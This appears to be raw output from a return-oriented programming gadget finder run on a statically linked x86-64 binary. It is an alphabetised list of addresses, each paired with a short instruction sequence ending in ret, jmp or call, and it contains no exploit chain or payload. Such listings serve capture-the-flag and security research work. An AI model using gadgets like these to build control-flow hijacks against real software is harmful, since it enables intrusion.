0x000000000046b5bb : add dword ptr [rax + 0x39], ecx ; ret 0x674
0x0000000000452d5b : add dword ptr [rax + 0x39], ecx ; ret 0x8c0f
0x000000000044b683 : add dword ptr [rax + 0x39], ecx ; ret 0xd774
0x0000000000471bd7 : add dword ptr [rax + 0x39], ecx ; ret 0xd775
0x000000000044b60d : add dword ptr [rax + 0x39], ecx ; ret 0xed75
0x000000000045f818 : add dword ptr [rax + 0x39], r9d ; ret
0x00000000004782c3 : add dword ptr [rax + 0x7900ff7a], eax ; sbb dword ptr [rax - 0x7d], ecx ; ret 0x8001
0x000000000046d3cf : add dword ptr [rax + 1], ecx ; ror byte ptr [rax - 0x77], 1 ; ret 0xc148
0x000000000040624a : add dword ptr [rax + 1], ecx ; ror byte ptr [rax - 0x77], 1 ; ret 0xe281
0x000000000043d0a1 : add dword ptr [rax + 9], ecx ; ret 0x8948
0x0000000000413657 : add dword ptr [rax + 9], ecx ; ret 0x8949
0x000000000044eafb : add dword ptr [rax - 0x50743], eax ; jmp qword ptr [rax]
0x0000000000402582 : add dword ptr [rax - 0x6bf0d006], eax ; ret 0xb60f
0x00000000004155d4 : add dword ptr [rax - 0x73], ecx ; clc ; cmovne rax, rcx ; ret
0x000000000045d058 : add dword ptr [rax - 0x75], ecx ; adc dword ptr [rax + 0x39], ecx ; ret 0x3873
0x0000000000434851 : add dword ptr [rax - 0x776b7fe], ecx ; ret
0x000000000040f670 : add dword ptr [rax - 0x77], ecx ; adc eax, 0x2921b8 ; ret
0x00000000004347e2 : add dword ptr [rax - 0x77], ecx ; add cl, byte ptr [rax - 0x77] ; clc ; ret
0x000000000046ad33 : add dword ptr [rax - 0x77], ecx ; add eax, 0x239675 ; ret
0x000000000044c6ed : add dword ptr [rax - 0x77], ecx ; push rsi ; sub dh, al ; add byte ptr [rcx - 0x7d], cl ; ret
0x000000000040568c : add dword ptr [rax - 0x77], ecx ; ret
0x000000000040be16 : add dword ptr [rax - 0x77], ecx ; ret 0x2475
0x0000000000441c9f : add dword ptr [rax - 0x77], ecx ; ret 0x2b48
0x000000000040fb04 : add dword ptr [rax - 0x77], ecx ; xchg dword ptr [rax - 0xcfffff8], eax ; ret
0x000000000046ad32 : add dword ptr [rax - 0x77], r9d ; add eax, 0x239675 ; ret
0x00000000004162e7 : add dword ptr [rax - 0x7d], ecx ; ret
0x000000000043e14b : add dword ptr [rax - 0x7d], ecx ; ret 0x4001
0x000000000044aa99 : add dword ptr [rax - 0x7d], ecx ; ret 0x4801
0x00000000004425ed : add dword ptr [rax - 0x7d], ecx ; ret 0x4901
0x00000000004025cd : add dword ptr [rax - 0x7d], ecx ; ret 0x8801
0x0000000000442205 : add dword ptr [rax - 0x7d], ecx ; ret 0x8b01
0x000000000045c6b7 : add dword ptr [rax - 0x7d], ecx ; ret 0x8b04
0x000000000044ce44 : add dword ptr [rax - 0x93b43], eax ; jmp qword ptr [rax]
0x000000000043bdd5 : add dword ptr [rax - 1], edi ; jmp 0x43bda6
0x0000000000405158 : add dword ptr [rax - 9], ecx ; ror byte ptr [rax + 1], 1 ; ret
0x000000000049c2d5 : add dword ptr [rax], 0 ; mov al, ch ; std ; jmp qword ptr [rdi]
0x000000000049c0a5 : add dword ptr [rax], 0xfd07e800 ; jmp qword ptr [rsi]
0x00000000004082a1 : add dword ptr [rax], eax ; add bl, dh ; ret
0x00000000004137a9 : add dword ptr [rax], eax ; add byte ptr [rax - 0x39], cl ; ret 0xffdf
0x000000000046211d : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x000000000043b5e9 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x16e9
0x0000000000478b8a : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x3948
0x0000000000464755 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x00000000004770d5 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0xc148
0x00000000004392ce : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; sal ebx, 1 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000041463d : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00000000004137c9 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x0000000000455bd8 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000043d56c : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000041d2b7 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043222f : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041d2e5 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00000000004402c1 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000048a75a : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x000000000048990a : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rsp
0x0000000000489732 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000048972a : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d4
0x0000000000489ec2 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d5
0x0000000000477237 : add dword ptr [rax], eax ; add byte ptr [rax], al ; call r14
0x000000000047718d : add dword ptr [rax], eax ; add byte ptr [rax], al ; call rax
0x0000000000477fa9 : add dword ptr [rax], eax ; add byte ptr [rax], al ; ja 0x477fba ; sbb eax, eax ; ret
0x0000000000477efd : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp rax
0x000000000046a10d : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x0000000000477840 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov edi, 1 ; call rax
0x000000000046f106 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov qword ptr [rdi], rsi ; ret
0x000000000045c1e5 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov rdi, rbx ; call rax
0x000000000040dcb3 : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000043ae09 : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x000000000045e060 : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000040f5a8 : add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x000000000040b088 : add dword ptr [rax], eax ; add byte ptr [rbp + 0x31], al ; dec dword ptr [rax + 0x39] ; ret 0x860f
0x0000000000477026 : add dword ptr [rax], eax ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x000000000043fb42 : add dword ptr [rax], eax ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000436f25 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7501
0x0000000000436f32 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7502
0x0000000000436f3f : add dword ptr [rax], eax ; add dh, dh ; ret 0x7504
0x0000000000436ef7 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7510
0x0000000000436f04 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7520
0x0000000000436f11 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7540
0x0000000000416a58 : add dword ptr [rax], eax ; and ch, 2 ; cmovne rax, rdx ; ret
0x0000000000415d7c : add dword ptr [rax], eax ; cmove rax, rdx ; ret
0x0000000000415ce3 : add dword ptr [rax], eax ; cmovne rax, rdx ; ret
0x0000000000475112 : add dword ptr [rax], eax ; movss dword ptr [rsp - 0x28], xmm0 ; ret
0x0000000000405500 : add dword ptr [rax], eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000043e1e1 : add dword ptr [rax], esp ; jmp rdx
0x000000000040d742 : add dword ptr [rbp + 0x738948c9], eax ; cmp byte ptr [rdi], cl ; ret 0x389
0x000000000043c952 : add dword ptr [rbp + 0xb], esi ; ret
0x0000000000474052 : add dword ptr [rbp + rcx*4 + 0x74], ecx ; ret
0x0000000000400a7c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000043af8e : add dword ptr [rbp - 0x57c03b0], ecx ; add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xc085
0x000000000044cc72 : add dword ptr [rbp - 0x7b], eax ; in al, 0xf ; lahf ; ret
0x000000000043d419 : add dword ptr [rbp - 0xc], esi ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000427a62 : add dword ptr [rbx + 0x157890e], ecx ; mov dword ptr [rdi], ecx ; ret
0x0000000000459a54 : add dword ptr [rbx - 0x4f743], eax ; jmp qword ptr [rax]
0x000000000043a786 : add dword ptr [rbx - 0x50f0fe40], eax ; ret 0xda89
0x000000000044c093 : add dword ptr [rbx - 0x7bf00006], eax ; ret
0x0000000000405c46 : add dword ptr [rbx - 0x7cb70030], eax ; ret
0x0000000000415e0d : add dword ptr [rcx + 0x29], ecx ; ret
0x0000000000415e65 : add dword ptr [rcx + 0x39], ecx ; ret 0x672
0x000000000040e624 : add dword ptr [rcx + 0x58b4803], ecx ; ret 0x2956
0x00000000004643e3 : add dword ptr [rcx + 1], ecx ; ret 0x24be
0x000000000043c9ac : add dword ptr [rcx + 9], ecx ; ret 0x894d
0x0000000000434881 : add dword ptr [rcx - 0x776b7fe], ecx ; ret
0x0000000000443b1f : add dword ptr [rcx - 0x77], ecx ; ret 0x8348
0x00000000004656b4 : add dword ptr [rcx - 0x7d], ecx ; jmp qword ptr [rax]
0x0000000000464b0b : add dword ptr [rcx - 0x7d], ecx ; ret 0xf01
0x00000000004453d8 : add dword ptr [rcx], ecx ; ret 0x3948
0x000000000043a062 : add dword ptr [rdi + 0x15], esi ; jb 0x43a070 ; mov byte ptr [rdi], cl ; ret
0x000000000040f762 : add dword ptr [rdi + rcx + 0x44], eax ; ret 0xf641
0x000000000049bf35 : add dword ptr [rdi], 0x48 ; or eax, 0x1370303 ; ret
0x000000000049becd : add dword ptr [rdi], 0x48 ; or eax, 0x34b0303 ; ret
0x000000000049bf01 : add dword ptr [rdi], 0x48 ; or eax, 0x35b0303 ; ret
0x000000000049bede : add dword ptr [rdi], 0xd ; add eax, dword ptr [rbx] ; or al, byte ptr [rcx] ; ret
0x000000000049bf12 : add dword ptr [rdi], 0xd ; add eax, dword ptr [rdx] ; cld ; ret
0x000000000049bf46 : add dword ptr [rdi], 0xd ; add eax, dword ptr [rdx] ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00000000004983cd : add dword ptr [rdi], 3 ; ret 0xa01
0x00000000004942da : add dword ptr [rdi], 3 ; ret 0xa03
0x000000000043a789 : add dword ptr [rdi], ecx ; scasd eax, dword ptr [rdi] ; ret 0xda89
0x000000000043a797 : add dword ptr [rdi], ecx ; scasd eax, dword ptr [rdi] ; ror dword ptr [rdi], 0xaf ; ret 0xffe9
0x0000000000445ae3 : add dword ptr [rdi], ecx ; test dword ptr [rsi], edx ; add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret
0x000000000043905c : add dword ptr [rdx + 2], esi ; mov byte ptr [rdi], cl ; ret
0x000000000042a8ed : add dword ptr [rdx + 4], esi ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000046fe9b : add dword ptr [rdx + rax*2], 1 ; ret
0x000000000049af74 : add dword ptr [rdx], 0x4a ; ret
0x000000000049dafc : add dword ptr [rdx], 0x55 ; ret
0x000000000049a5dc : add dword ptr [rdx], 0x58 ; or cl, byte ptr [rsi] ; or byte ptr [rdi + 0xb], al ; push rsp ; ret
0x0000000000496df0 : add dword ptr [rdx], 0x5a ; ret
0x000000000049dab8 : add dword ptr [rdx], 0x76 ; ret
0x000000000040ed78 : add dword ptr [rip + 0x294f95], 1 ; ret
0x0000000000496735 : add dword ptr [rsi + rcx + 0x10], ecx ; ret
0x00000000004951cf : add dword ptr [rsi + rcx + 0x30], ecx ; add ch, byte ptr [rsi + rcx + 8] ; ret
0x0000000000434862 : add dword ptr [rsi - 0x77], esp ; add cl, byte ptr [rax - 0x77] ; clc ; ret
0x000000000049648e : add dword ptr [rsp + rax*2], 0xe ; xor byte ptr [rdx], al ; ret
0x000000000047454d : add eax, 0x1489066 ; ret 0xb70f
0x000000000044a450 : add eax, 0x18c48348 ; ret
0x0000000000416b79 : add eax, 0x1bb12 ; cmove rax, rdx ; ret
0x0000000000415d79 : add eax, 0x1cf42 ; cmove rax, rdx ; ret
0x000000000043b7ca : add eax, 0x1f0fc3f3 ; add byte ptr [rax - 0x39], cl ; ret 0xffc0
0x000000000041dbaa : add eax, 0x20 ; add rax, rdi ; vzeroupper ; ret
0x0000000000416730 : add eax, 0x221ab ; cmove rax, rdx ; ret
0x0000000000416ab9 : add eax, 0x22732 ; cmovne rax, rdx ; ret
0x0000000000416979 : add eax, 0x22862 ; cmovne rax, rdx ; ret
0x0000000000416819 : add eax, 0x229d2 ; cmovne rax, rdx ; ret
0x0000000000416b20 : add eax, 0x22a7b ; cmovne rax, rdx ; ret
0x0000000000479911 : add eax, 0x22aa6e ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x0000000000479801 : add eax, 0x22ab7e ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00000000004169e0 : add eax, 0x22bab ; cmovne rax, rdx ; ret
0x0000000000416880 : add eax, 0x22d1b ; cmovne rax, rdx ; ret
0x0000000000416aff : add eax, 0x22ecc ; cmovne rax, rdx ; ret
0x00000000004169bf : add eax, 0x22ffc ; cmovne rax, rdx ; ret
0x0000000000415d00 : add eax, 0x2307b ; cmovne rax, rdx ; ret
0x000000000041685f : add eax, 0x2316c ; cmovne rax, rdx ; ret
0x0000000000470031 : add eax, 0x23488a ; ret
0x000000000046f4b9 : add eax, 0x234baa ; ret
0x000000000046f49e : add eax, 0x234bc5 ; add rsp, 8 ; ret
0x00000000004168eb : add eax, 0x23660 ; cmovne rax, rdx ; ret
0x00000000004168ce : add eax, 0x237dd ; cmovne rax, rdx ; ret
0x000000000041691f : add eax, 0x2390c ; cmovne rax, rdx ; ret
0x000000000046ae9c : add eax, 0x239507 ; mov qword ptr [rsi], rax ; ret
0x000000000046ae2b : add eax, 0x239580 ; ret
0x000000000046adf2 : add eax, 0x2395b9 ; add rsp, 8 ; ret
0x000000000046ad36 : add eax, 0x239675 ; ret
0x000000000045a284 : add eax, 0x244fb7 ; mov rax, qword ptr [rax + rsi*8] ; jmp rax
0x0000000000459c7a : add eax, 0x2455c1 ; mov rax, qword ptr [rax + rsi*8] ; jmp rax
0x000000000044f752 : add eax, 0x24f3e9 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x000000000044f1fb : add eax, 0x24f940 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x000000000044e584 : add eax, 0x2500b7 ; jmp rax
0x0000000000447d02 : add eax, 0x25c171 ; ret
0x000000000043ee82 : add eax, 0x263479 ; ret
0x00000000004403f2 : add eax, 0x264531 ; ret
0x0000000000416a99 : add eax, 0x28d352 ; add dh, byte ptr [rax + rcx - 9] ; ret 0
0x0000000000416959 : add eax, 0x28d492 ; add dh, byte ptr [rax + rcx - 9] ; ret 0
0x00000000004142c7 : add eax, 0x28d594 ; ret
0x00000000004167f9 : add eax, 0x28d5f2 ; add dh, byte ptr [rax + rcx - 9] ; ret 0
0x00000000004142d1 : add eax, 0x28fa96 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000410a7d : add eax, 0x290dde ; ret
0x000000000040f695 : add eax, 0x2921ae ; ret
0x000000000040f685 : add eax, 0x2921b6 ; ret
0x000000000040f635 : add eax, 0x2921be ; ret
0x000000000040f60f : add eax, 0x2921cc ; ret
0x000000000040f625 : add eax, 0x2921d6 ; ret
0x000000000040f5df : add eax, 0x292204 ; ret
0x000000000040f5be : add eax, 0x292249 ; ret
0x000000000040ece2 : add eax, 0x292439 ; ret
0x0000000000410a31 : add eax, 0x293336 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000040f5f4 : add eax, 0x29479b ; ret
0x000000000040eddd : add eax, 0x294f32 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000401311 : add eax, 0x2a2ae8 ; or byte ptr [rdi], cl ; ret 0x589
0x000000000046fa7e : add eax, 0x38c48348 ; ret
0x000000000041dbca : add eax, 0x40 ; add rax, rdi ; vzeroupper ; ret
0x0000000000436098 : add eax, 0x48054289 ; lea eax, [rdx + 8] ; ret
0x00000000004348c8 : add eax, 0x48054289 ; mov eax, edi ; ret
0x0000000000436596 : add eax, 0x480f8948 ; mov dword ptr [rdi + 5], edx ; ret
0x0000000000436119 : add eax, 0x5428948 ; lea rax, [rdx + 0xc] ; ret
0x0000000000434909 : add eax, 0x5428948 ; mov rax, rdi ; ret
0x000000000043bd48 : add eax, 0x58c48348 ; ret
0x000000000046fc20 : add eax, 0x5b ; cmovne rax, rdx ; ret
0x000000000048b2fd : add eax, 0x5c00000 ; add byte ptr [rax], al ; ret 5
0x000000000041dbea : add eax, 0x60 ; add rax, rdi ; vzeroupper ; ret
0x0000000000416b49 : add eax, 0x6c52 ; cmove rax, rdx ; ret
0x0000000000416759 : add eax, 0x6d12 ; cmove rax, rdx ; ret
0x00000000004167bd : add eax, 0x79ee ; je 0x416792 ; ret
0x00000000004660c4 : add eax, 0x83480000 ; ret
0x000000000041cef7 : add eax, 0x83480000 ; ret 0x4910
0x0000000000430821 : add eax, 0x83480000 ; ret 0xe910
0x000000000041cf25 : add eax, 0x83480000 ; ret 0xeb10
0x000000000043609b : add eax, 0x8428d48 ; ret
0x000000000045f159 : add eax, 0x912 ; cmove rax, rdx ; ret
0x0000000000460489 : add eax, 0xa12 ; cmove rax, rdx ; ret
0x000000000041f5ea : add eax, 0xc0310000 ; ret
0x000000000043611d : add eax, 0xc428d48 ; ret
0x0000000000436bfd : add eax, 0xc478d48 ; ret
0x000000000041e5ab : add eax, 0xc634900 ; xchg eax, ebx ; add rcx, r11 ; jmp rcx
0x000000000045f129 : add eax, 0xe02 ; cmove rax, rdx ; ret
0x0000000000444556 : add eax, 0xe9000000 ; ret 0xfffc
0x000000000047750a : add eax, 0xf7148948 ; ret
0x0000000000427a53 : add eax, 0xf7f0ff3 ; ret
0x000000000047981a : add eax, 0xffff50e9 ; push rbx ; ret
0x00000000004402a5 : add eax, 1 ; push rax ; call rbx
0x00000000004610a1 : add eax, 1 ; ret
0x0000000000461098 : add eax, 2 ; ret
0x000000000046231c : add eax, 2 ; test ecx, ecx ; jne 0x462378 ; ret
0x00000000004610b1 : add eax, 3 ; ret
0x000000000044a369 : add eax, dword ptr [0] ; ret
0x0000000000444283 : add eax, dword ptr [rax] ; add bh, dh ; ret 0
0x0000000000467218 : add eax, dword ptr [rax] ; add bl, dh ; ret
0x00000000004743bc : add eax, dword ptr [rax] ; add byte ptr [rax + 1], cl ; ret
0x0000000000411e20 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x73], cl ; push rax ; adc dh, dh ; ret 0xf0f
0x0000000000400e7b : add eax, dword ptr [rax] ; add byte ptr [rax - 0x75], cl ; push rax ; and byte ptr [rax + 1], cl ; ret 0xb70f
0x000000000041d0d7 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004309c1 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041d105 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000043c85c : add eax, dword ptr [rax] ; add byte ptr [rax], al ; pop rbp ; pop r12 ; jmp rax
0x00000000004610f3 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; ret
0x0000000000474154 : add eax, dword ptr [rax] ; add byte ptr [rcx + 0x3c8b48d8], cl ; ret 0x87f6
0x000000000043da05 : add eax, dword ptr [rax] ; add byte ptr [rcx - 0x77], al ; ret
0x0000000000468056 : add eax, dword ptr [rax] ; add dh, dh ; ret 0x7403
0x0000000000466d4f : add eax, dword ptr [rax] ; add dh, dh ; ret 0xf08
0x0000000000454915 : add eax, dword ptr [rax] ; add dh, dh ; ret 0xf40
0x000000000044571c : add eax, dword ptr [rax] ; mov edx, 0x1d0 ; call 0x4019f9
0x00000000004456fd : add eax, dword ptr [rax] ; mov edx, 0x1d6 ; call 0x4019f9
0x000000000045bed4 : add eax, dword ptr [rax] ; movsxd rax, dword ptr [rcx + rax*4] ; add rax, rcx ; jmp rax
0x000000000045c5a1 : add eax, dword ptr [rax] ; movsxd rax, dword ptr [rdx + rax*4] ; add rax, rdx ; jmp rax
0x000000000043a490 : add eax, dword ptr [rax] ; pop rbx ; ret
0x0000000000468cec : add eax, dword ptr [rbp - 0xb8] ; call rax
0x000000000049bee1 : add eax, dword ptr [rbx] ; or al, byte ptr [rcx] ; ret
0x00000000004620da : add eax, dword ptr [rcx + rdx] ; ret
0x0000000000471707 : add eax, dword ptr [rdx + 8] ; call rax
0x000000000049bf15 : add eax, dword ptr [rdx] ; cld ; ret
0x000000000049bf49 : add eax, dword ptr [rdx] ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000499d32 : add eax, dword ptr [rsi + 0xe] ; and byte ptr [rsi + rcx + 0x18], bh ; ret
0x0000000000467dd6 : add eax, dword ptr [rsi] ; call rax
0x0000000000475146 : add eax, eax ; jmp rax
0x000000000043f004 : add eax, ebp ; jmp rax
0x00000000004680b7 : add eax, ebx ; call rax
0x000000000043ef8c : add eax, ebx ; jmp rax
0x0000000000432b48 : add eax, ecx ; add rax, rdi ; vzeroupper ; ret
0x000000000040fce6 : add eax, ecx ; cmp rax, rdx ; jne 0x40fcf7 ; ret
0x000000000045be2b : add eax, ecx ; jmp rax
0x000000000041d4f9 : add eax, ecx ; ret
0x0000000000432ead : add eax, ecx ; sub rax, rdx ; vzeroupper ; ret
0x000000000041da26 : add eax, ecx ; vzeroupper ; ret
0x000000000041d4f6 : add eax, edi ; add rax, rcx ; ret
0x000000000041da23 : add eax, edi ; add rax, rcx ; vzeroupper ; ret
0x000000000047536c : add eax, edi ; jmp rax
0x000000000041d724 : add eax, edi ; ret
0x000000000046fdd0 : add eax, edi ; sub rax, r8 ; ret
0x0000000000432f65 : add eax, edi ; sub rax, rdx ; vzeroupper ; ret
0x0000000000438f0a : add eax, edi ; sub rax, rsi ; ret
0x000000000041db9a : add eax, edi ; vzeroupper ; ret
0x0000000000401b66 : add eax, edx ; jmp rax
0x0000000000432e56 : add eax, edx ; sub rax, rdi ; ret
0x0000000000460d9b : add eax, edx ; sub rax, rdi ; shr rax, 2 ; ret
0x000000000043a43c : add eax, esi ; jmp rax
0x000000000040ea7d : add eax, esi ; mov qword ptr [rdx + 8], rax ; xor eax, eax ; ret
0x00000000004763bd : add eax, esp ; jmp rax
0x0000000000451368 : add ebp, 0x30 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00000000004067bc : add ebp, 8 ; mov qword ptr [r15], rax ; jmp 0x40678d
0x000000000040693b : add ebp, 8 ; mov qword ptr [r15], rax ; jmp 0x40690d
0x0000000000451f33 : add ebp, eax ; jmp rsp
0x0000000000467dd2 : add ebx, 0x18 ; add rax, qword ptr [r14] ; call rax
0x000000000047496a : add ebx, dword ptr [rax + 0x5a] ; pop rbx ; ret
0x0000000000472f29 : add ebx, dword ptr [rbp + 0x41] ; pop rsp ; ret
0x000000000040d7c1 : add ebx, dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x000000000049bf06 : add ebx, dword ptr [rbx + 3] ; ret
0x000000000043fb5f : add ebx, dword ptr [rbx - 0x2d] ; loopne 0x43fbc8 ; pop r12 ; ret
0x000000000046d9f1 : add ebx, eax ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x000000000041e30b : add ebx, eax ; nop dword ptr [rax] ; ret
0x0000000000427c13 : add ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x000000000043a047 : add ecx, 0x40 ; cmp rdx, rcx ; jne 0x43a03c ; ret
0x00000000004348b5 : add ecx, dword ptr [r9 - 0x76b7fcbe] ; clc ; ret
0x000000000046b401 : add ecx, dword ptr [rax + 0x39] ; call 0xffffffff8b8f9d88
0x00000000004348b9 : add ecx, dword ptr [rax - 0x77] ; clc ; ret
0x000000000046a1e9 : add ecx, dword ptr [rax - 0x77] ; mov rax, r8 ; pop rbx ; ret
0x0000000000443ba5 : add ecx, dword ptr [rax - 0x77] ; ret 0x3389
0x000000000044631c : add ecx, dword ptr [rax - 0x77] ; ret 0x3b89
0x00000000004430a9 : add ecx, dword ptr [rax - 0x7b] ; ror byte ptr [rdi + rcx + 0x49], cl ; ret 0xc149
0x0000000000475e7f : add ecx, dword ptr [rax - 0x7d] ; ret
0x0000000000406fe1 : add ecx, dword ptr [rbp + rcx*4 + 0x64] ; ret
0x000000000046c76a : add ecx, dword ptr [rbp - 0x77] ; dec byte ptr [rax - 0x7d] ; ret
0x0000000000427982 : add ecx, dword ptr [rbx + 0x357890e] ; mov dword ptr [rdi], ecx ; ret
0x000000000049bed2 : add ecx, dword ptr [rbx + 3] ; ret
0x0000000000436534 : add ecx, dword ptr [rcx + 0x357890f] ; ret
0x000000000047401f : add ecx, dword ptr [rcx + rcx*4 - 0x16] ; mov rsi, r12 ; mov edi, ebp ; call rax
0x00000000004348b6 : add ecx, dword ptr [rcx - 0x76b7fcbe] ; clc ; ret
0x000000000043af94 : add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xc085
0x000000000043aff5 : add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xd284
0x0000000000451689 : add ecx, eax ; mov eax, r9d ; ret
0x000000000041fc1b : add ecx, ebx ; jmp r9
0x000000000041e5b2 : add ecx, ebx ; jmp rcx
0x000000000043a464 : add ecx, esi ; jmp rcx
0x00000000004783ce : add edi, dword ptr [rax + 4] ; jne 0x4783f9 ; ret
0x000000000041fc18 : add edi, edx ; add r9, r11 ; jmp r9
0x0000000000405ccc : add edi, edx ; jmp rdi
0x000000000047ece1 : add edi, esp ; jmp qword ptr [rbx]
0x000000000047eccd : add edi, esp ; jmp rdx
0x0000000000471ba7 : add edx, eax ; jmp 0x471bb5
0x000000000046e4d2 : add edx, eax ; mov rax, rdx ; pop rbx ; ret
0x00000000004059e3 : add edx, edi ; jmp rdx
0x00000000004484c6 : add esi, dword ptr [rdi + rax - 0xd] ; ret
0x00000000004490fc : add esi, eax ; add byte ptr [rdi], ch ; mov byte ptr [rdi], 0 ; ret
0x00000000004498b5 : add esi, eax ; jmp rsi
0x0000000000403d45 : add esi, eax ; mov eax, dword ptr [r15 + 4] ; jmp 0x403d17
0x0000000000427b33 : add esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x0000000000439265 : add esi, ebx ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000043b77c : add esi, ebx ; ret
0x0000000000413500 : add esi, ebx ; stosq qword ptr [rdi], rax ; pop rbx ; ret
0x000000000043a56e : add esi, edi ; int1 ; pop rbx ; mov eax, eax ; ret
0x0000000000468321 : add esi, edi ; test edi, edi ; jne 0x46832f ; call rax
0x000000000041fc15 : add esi, edx ; add rdi, rdx ; add r9, r11 ; jmp r9
0x000000000040d481 : add esp, 0x10 ; pop rbx ; jmp rax
0x0000000000408661 : add esp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000040e97f : add esp, 0x10 ; pop rbx ; ret
0x0000000000409d55 : add esp, 0x10 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000438e0d : add esp, 0x100 ; sub rax, rdx ; ret
0x00000000004063a2 : add esp, 0x110 ; pop rbx ; ret
0x000000000044a69a : add esp, 0x148 ; ret
0x0000000000414433 : add esp, 0x18 ; mov rax, rdx ; pop rbx ; pop rbp ; ret
0x0000000000414476 : add esp, 0x18 ; pop rbx ; pop rbp ; jmp rax
0x000000000043ed2a : add esp, 0x18 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000004096e5 : add esp, 0x18 ; pop rbx ; pop rbp ; ret
0x0000000000414ef9 : add esp, 0x18 ; ret
0x000000000040dc2d : add esp, 0x20 ; mov ecx, edx ; pop rbx ; xor edx, edx ; jmp rax
0x000000000040d9dd : add esp, 0x20 ; pop rbx ; jmp rax
0x000000000040dc66 : add esp, 0x20 ; pop rbx ; mov ecx, edx ; xor edx, edx ; jmp rax
0x0000000000447f7b : add esp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000040d74f : add esp, 0x20 ; pop rbx ; ret
0x000000000043b74a : add esp, 0x28 ; ret
0x0000000000441058 : add esp, 0x30 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000472dcb : add esp, 0x30 ; pop rbx ; ret
0x0000000000474f36 : add esp, 0x38 ; pop rbx ; pop r14 ; ret
0x0000000000406214 : add esp, 0x38 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000040cf6e : add esp, 0x38 ; pop rbx ; pop rbp ; ret
0x0000000000461f86 : add esp, 0x38 ; ret
0x000000000046d1ec : add esp, 0x48 ; jmp qword ptr [rax]
0x000000000043b422 : add esp, 0x48 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000046d439 : add esp, 0x48 ; ret
